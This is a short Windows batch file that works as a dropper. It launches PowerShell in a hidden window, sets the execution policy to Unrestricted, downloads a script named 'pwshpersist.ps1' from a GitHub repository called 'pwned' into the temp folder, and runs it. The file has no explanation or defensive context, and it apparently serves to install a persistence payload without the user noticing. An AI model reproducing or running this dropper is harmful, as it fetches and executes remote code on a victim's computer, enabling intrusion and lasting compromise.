@echo off
powershell -WindowStyle Hidden -command "Set-ExecutionPolicy Unrestricted; wget -Uri 'http://github.com/Aristofer-Magnus/pwned/raw/main/pwshpersist.ps1' -Outfile \"$env:temp\pwshpersist.ps1\"; & \"$env:temp\./pwshpersist.ps1\""
pause
